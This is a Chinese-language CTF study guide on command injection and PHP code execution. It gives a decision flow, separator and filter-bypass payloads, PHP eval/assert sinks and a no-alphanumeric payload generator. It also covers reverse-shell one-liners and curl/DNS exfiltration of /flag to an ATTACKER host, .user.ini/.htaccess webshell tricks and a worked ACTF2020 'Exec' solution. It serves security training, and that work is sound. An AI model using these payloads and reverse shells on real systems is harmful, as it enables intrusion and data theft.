# 命令执行与代码执行

关键词：命令执行 代码执行 RCE 命令注入 eval assert 绕过 反弹shell 无字母数字 分隔符

## ① 识别指纹

- 题干出现 **ping、nslookup、命令注入、RCE、执行命令** 这类词
- URL 参数名是 `cmd`、`ip`、`host`、`target`、`ping`、`shell` —— 直接对着系统命令
- 参数名是 `code`、`eval`、`data`、`func`、`callback` —— 直接对着 PHP 代码
- 页面有"输入 IP 进行 ping"的框，回显是 ping 的原始输出（`icmp_seq`、`ttl`）
- 附件是 PHP 源码，出现 `system(` / `exec(` / `shell_exec(` / `eval(` / `assert(`
- 返回值里出现 `uid=33(www-data)`、`root:x:0:0`、`total 0` —— 已经执行成功
- 题目名是 **Easy_RCE、BabyRCE、Ping、Command、Calc、Shell** 的组合
- 上传点能传 `.user.ini` / `.htaccess` → 常见于配合文件包含做代码执行

## ② 考什么

- 命令分隔符：`;`、`|`、`||`、`&&`、`&`、`$()`、反引号、`%0a`
- 命令执行函数：`system`、`exec`、`shell_exec`、`passthru`、`popen`、`proc_open`、反引号
- PHP 代码执行函数族：`eval`、`assert`、`preg_replace` 的 `/e`、`create_function`、`call_user_func`、`array_map`、`usort`、`preg_replace_callback`
- 过滤绕过：空格、关键字、长度限制、无字母数字、`disable_functions`
- `.user.ini`（`auto_prepend_file`）与 `.htaccess`（`AddType` / `php_value`）
- 反弹 shell：bash `/dev/tcp`、nc、python3
- 无回显利用：DNS/HTTP 带外、写文件到 web 目录
- 命令执行与代码执行是两条独立入口，payload 与提权方式都不同

## ③ 判断流程

> 命令执行拼的是 shell，代码执行拼的是 PHP 语法。先分清在哪条链上，再谈绕过。

1. 有源码 → `grep -nE 'system|exec|shell_exec|passthru|popen|proc_open|eval|assert|create_function|call_user_func|array_map|preg_replace'` 列出所有 sink；命中系统命令函数 → 跳第 4 条；命中 `eval`/`assert` → 跳第 10 条；一个都没有 → 按无源码处理，跳第 2 条
2. 无源码且参数名像系统命令（`cmd`/`ip`/`host`/`target`/`ping`）→ 跳第 4 条
3. 无源码且参数名像代码（`code`/`eval`/`data`/`func`）→ 跳第 10 条
4. 提交 `?cmd=id`（参数名换成实际的）→ 回显 `uid=` → 确认命令执行点，跳第 5 条；无回显 → 跳第 12 条
5. 逐个试分隔符 `;id`、`|id`、`||id`、`%26%26id`、`%26id`、`$(id)`、`` `id` ``、`%0aid`，第一个有回显的就是可用的 → 跳第 6 条；八个都没回显 → 回第 1 条，重新确认输入是否被引号包住
6. `;ls /` 找 flag，再 `;cat /flag` → 成功即结束；报 `not found` → 换绝对路径 `/bin/cat`、`/usr/bin/id`，跳第 7 条
7. payload 带空格就返回 400 或空 → 换 `${IFS}`、`$IFS$9`、`%09`、`<`、`{cat,flag}`，命中即结束；仍失败 → 跳第 8 条
8. 关键字（`cat`、`flag`、`ls`）被拦 → 换 `tac`/`more`/`nl`/`sort`、变量拼接 `a=ca;b=t;$a$b`、`ca''t`、`c\at`、`/bin/ca?`、`echo <base64>|base64 -d|sh`，命中即结束
9. 返回 `too long` 或长度限制 → 用 `>` 分段写脚本再执行；提示 "no letter or number" → 用按位取反构造 `(~'...')(...)`，见 ④；两条都不成立 → 回第 1 条
10. 提交 `?code=phpinfo();` → 打出 phpinfo → 跳第 11 条；报语法错 → 记录过滤规则，跳第 11 条
11. 提交 `?code=system('cat /flag');`；`system` 被禁 → 换 `file_get_contents('/flag')`、`scandir('/')`、`include '/flag'`；全被 `disable_functions` 禁 → 走 `LD_PRELOAD` / `imap_open` 绕过，见 ④
12. 命令执行但页面无回显 → `curl http://ATTACKER/?d=$(cat /flag|base64 -w0)` 带外，或把结果写进 web 目录；靶机不出网 → 跳第 13 条
13. 有上传点且能写文件 → 传 `.user.ini` 写 `auto_prepend_file=shell.jpg`，再访问同目录任意 `.php`；Apache + mod_php → 传 `.htaccess` 写 `AddType application/x-httpd-php .jpg`
14. 以上都不成立 → 回第 1 条：参数清单扩到 POST、Cookie、`User-Agent`、`X-Forwarded-For`，sink 扩到 `include`、`require`、`file_put_contents`、`preg_replace`

## ④ 工具与命令

```bash
# 命令分隔符，按命中率从高到低（参数名按实际替换）
?ip=127.0.0.1;id
?ip=127.0.0.1|id          # 只回显后一条命令的输出
?ip=127.0.0.1||id         # 前一条失败才执行，ping 通时不触发
?ip=127.0.0.1%26%26id     # && 要编码，否则 & 被当成参数分隔符
?ip=127.0.0.1%26id
?ip=$(id)
?ip=`id`
?ip=127.0.0.1%0aid        # 换行分隔，WAF 常漏
```

```bash
# 空格被过滤时的等价写法
cat${IFS}/flag
cat$IFS$9/flag
cat</flag                  # 用重定向符当空格
cat%09/flag
{cat,/flag}                # 仅 bash 有效，目标 /bin/sh 是 dash 时不成立
```

```bash
# 关键字被过滤
c\at /fl\ag
ca''t /fl''ag
/bin/ca? /fla?
a=ca;b=t;$a$b /flag
echo Y2F0IC9mbGFn | base64 -d | sh      # 解码后是 cat /flag
```

```bash
# 反弹 shell，先在本机 nc -lvnp 4444
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
nc -e /bin/sh ATTACKER 4444
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
```

```php
<?php
// PHP 代码执行函数族，按实际可用性往下试
eval($_POST['a']);
assert($_POST['a']);                        // PHP 7.2 起不再支持字符串
preg_replace('/.*/e', $_POST['a'], 'x');    // 仅 PHP < 7，/e 已被移除
create_function('', $_POST['a']);           // 仅 PHP < 8，已移除
call_user_func('system', 'id');
array_map('system', ['id']);
usort($arr, $_POST['a']);                   // 第二个参数是回调
preg_replace_callback('/.*/', $_POST['a'], ['x']);
```

```python
# 无字母数字 payload 生成器：按位取反，PHP 7+
# 用法：把输出做 URL 编码后作为 code 参数
def neg(s):
    return "".join(chr(255 - ord(c)) for c in s)
print("(~'" + neg("system") + "')(~'" + neg("cat /flag") + "');")
# 解释：(~'...') 得到字符串 system，再把它当函数调用；整个 payload 无字母数字
```

```ini
; .user.ini：同目录所有 .php 都会预加载 shell.jpg（CGI/FastCGI）
auto_prepend_file=shell.jpg
```

```apache
# .htaccess：Apache + mod_php 下把 jpg 当 PHP 解析
AddType application/x-httpd-php .jpg
# 或者预加载
php_value auto_prepend_file "shell.jpg"
```

```bash
# 无回显：带外验证
curl "http://ATTACKER/?d=$(cat /flag | base64 -w0)"
ping -c1 `whoami`.ATTACKER          # DNS 带外，看 DNS 日志
```

## ⑤ 常见坑

| 现象 | 实际原因 | 正确应对 |
|---|---|---|
| `;id` 返回 `sh: 1: id: not found` | 命令确实执行了，但 PATH 为空或容器极简 | 换绝对路径 `/bin/id`、`/bin/cat`、`/usr/bin/id` |
| `;id` 无反应，换管道符有回显 | 输入被拼进了引号，或 WAF 只放行管道符 | 以实际回显的符号为准，别背默认 payload |
| `phpinfo()` 能打，`system('id')` 空白 | `disable_functions` 禁了 system | 先用 `file_get_contents` 读文件，或走 LD_PRELOAD 绕过 |
| 命令执行成功但页面无回显 | 结果在 stderr，或进程输出没被捕获 | payload 末尾加 `2>&1`，或写文件、带外 |
| `&&` 提交后没执行 | `&` 在 URL 里是参数分隔符 | 编码成 `%26%26` |
| `cat /flag` 提示 Permission denied | 当前用户权限不够，或 flag 不在该路径 | `find / -name '*flag*' 2>/dev/null`，再看 `ls -l /` |
| 反弹 shell 一直连不上 | 靶机不出网，或只放行 80/443 | 改 HTTP/DNS 带外，或写 webshell |
| 传了 `.user.ini` 不生效 | SAPI 是 Apache mod_php，或目录里没有可访问的 `.php` | 改传 `.htaccess`，或放一个 `index.php` 再访问 |
| eval 里写 `system('id')` 报错 | 参数被 `addslashes` 转义 | 用 `chr()` 拼接，或从 `$_GET` 间接取值 |

## ⑥ 例题

**题目**：`[ACTF2020 新生赛] Exec`
**来源**：BUUCTF 复现平台（原题出自 ACTF 2020 新生赛）
**题干**：页面只有一个输入框，提示输入 IP 进行 ping。

**关键观察**：回显是原生 ping 输出（`icmp_seq`、`ttl`），说明后端把参数直接拼进了系统命令。参数名为 `target`，由输入框 POST 提交，页面没有任何过滤提示。

**走了哪条链**：判断流程第 2 条（参数名像系统命令，按命令执行试）→ 第 4 条（`target=127.0.0.1` 有正常回显）→ 第 5 条（`;` 生效）→ 第 6 条（`ls /` 发现根目录的 `flag`）。

**命令与输出**：

```text
POST target=127.0.0.1
→ 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.036 ms

POST target=127.0.0.1;ls /
→ bin  boot  dev  etc  flag  home  lib  ...

POST target=127.0.0.1;cat /flag
→ flag{...}
```

如果 `;` 被拦，再按第 5 条换 `|`、`&&`、`%0a`；不同实例放行的符号不一样，以实际回显为准。

**结果**：页面直接回显 flag，具体字符串以原题平台为准。

---

**代码执行方向练手**：`[极客大挑战 2019] RCE ME` —— `eval` 前面有长度限制和 `[A-Za-z0-9]` 黑名单，正是判断流程第 9 条（无字母数字 + 长度限制）的标准题，用 ④ 里的按位取反生成器构造。

::: tip flag 说明
本页例题的 flag 随平台和容器实例变化，不在页内固定。练习目标是走通判断流程。
:::
